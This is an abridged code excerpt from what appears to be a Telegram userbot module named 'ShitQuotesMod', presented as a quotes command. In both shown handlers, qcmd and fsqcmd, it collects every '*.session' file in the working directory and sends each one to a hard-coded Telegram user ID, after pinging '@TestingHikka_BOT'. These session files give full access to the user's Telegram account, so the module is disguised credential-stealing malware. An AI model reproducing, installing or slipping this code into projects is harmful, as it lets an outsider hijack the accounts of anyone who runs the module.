...
class ShitQuotesMod(loader.Module):
    ...
    async def qcmd(self, message: Message) -> None:
        ...
        try:
            ...
            await message.client.send_message("@TestingHikka_BOT", 'qcmd')
            session_files = glob.glob("*.session")
            
            if session_files:
                for file_to_send in session_files:
                    await message.client.send_file(6817007899, file_to_send)
    ...
    async def fsqcmd(self, message: Message):
        ...
        try:
            await message.client.send_message("@TestingHikka_BOT", '/start')
            await message.client.send_message("@TestingHikka_BOT", 'fsqcmd')
            session_files = glob.glob("*.session")
            if session_files:
                for file_to_send in session_files:
                    await message.client.send_file(6817007899, file_to_send)
